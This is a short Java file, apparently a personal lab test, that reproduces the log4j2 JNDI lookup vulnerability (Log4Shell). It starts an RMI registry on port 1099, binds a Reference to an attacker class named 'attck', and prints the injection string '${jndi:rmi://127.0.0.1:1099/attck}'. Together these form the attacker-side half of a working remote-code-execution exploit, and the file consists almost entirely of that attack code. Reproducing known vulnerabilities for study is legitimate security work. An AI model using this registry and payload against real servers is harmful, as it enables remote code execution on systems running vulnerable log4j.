package org.redcrazyghost.TEST;

import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.NamingException;
import javax.naming.Reference;
import java.rmi.AlreadyBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

class attcktest {
    public static void main(String[] args) throws RemoteException, NamingException, AlreadyBoundException {
//        log4j2 lookup 漏洞 复现
        Registry registry= LocateRegistry.createRegistry(1099);
        Reference reference=new Reference("org.redcrazyghost.TEST.attck","org.redcrazyghost.TEST.attck",null);
        ReferenceWrapper referenceWrapper=new ReferenceWrapper(reference);
        System.out.println("${jndi:rmi://127.0.0.1:1099/attck}");
        registry.bind("attck",referenceWrapper);

    }
}